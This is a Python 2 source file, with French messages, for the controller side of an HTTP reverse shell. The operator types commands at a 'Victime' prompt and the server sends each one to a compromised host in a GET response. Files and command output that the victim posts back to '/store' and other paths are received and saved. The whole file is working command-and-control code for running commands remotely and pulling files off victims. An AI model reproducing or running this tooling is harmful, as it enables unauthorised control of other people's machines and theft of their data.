import BaseHTTPServer
import os
import cgi
import HTTP_reverse_shell_server

HOST_NAME = '10.142.10.22'
PORT_NUMBER = 80
HTTP_reverse_shell_server.FILE_NAME = 'sans-nom'

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):
    
        command = raw_input("Victime de propA> ")
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command)


    def do_POST(s):

        FILE_NAME = 'sans-nom'
        if s.path == '/nomDeFichier':

            s.send_response(200)
            s.end_headers()
            length = 0
                    
            if s.headers.getheader('Content-Length') is not None:
                length = int(s.headers.getheader('Content-Length'))
            postVar = s.rfile.read(length)

            if 'Nom du fichier' in postVar:
                HTTP_reverse_shell_server.FILE_NAME = postVar.replace("Nom du fichier: ", "", 1).split("\\")[-1]

            elif 'Fichier introuvable' in postVar:
                print '[-] Fichier introuvable, c\'est le bon path?'
                return

        if s.path == '/store':
            try:
                                
                fs = None
                ctype, blabla = cgi.parse_header(s.headers.getheader('content-type'))
                
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=s.rfile, headers = s.headers, environ={'REQUEST_METHOD':'POST'})

                else:
                    print '[~] Requete POST inattendue'

                if fs is not None:
                    fs_up = fs['file']
                    
                    print 'etape cp: '+HTTP_reverse_shell_server.FILE_NAME
                    with open(HTTP_reverse_shell_server.FILE_NAME, 'wb') as o:
                        o.write(fs_up.file.read())
                        s.send_response(200)
                        s.end_headers()
                    print '[+] Fichier '+HTTP_reverse_shell_server.FILE_NAME+' recupere avec succes!'

                else:
                    print '[-] Fichier vide, un probleme a du arriver'
                    return

            except Exception as e:
                print '[-] Error: '+str(e)
            return

        else:            

            s.send_response(200)
            s.end_headers()
            length = 0
            if s.headers.getheader('Content-Length') is not None:
                length = int(s.headers.getheader('Content-Length'))
            postVar = s.rfile.read(length)
            print postVar

if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)

    try:
        httpd.serve_forever()
        print 'Taper \'aide\' pour connaitre les commandes a taper'
    except KeyboardInterrupt:
        print '[!] serveur web deco'
        httpd.server_close()
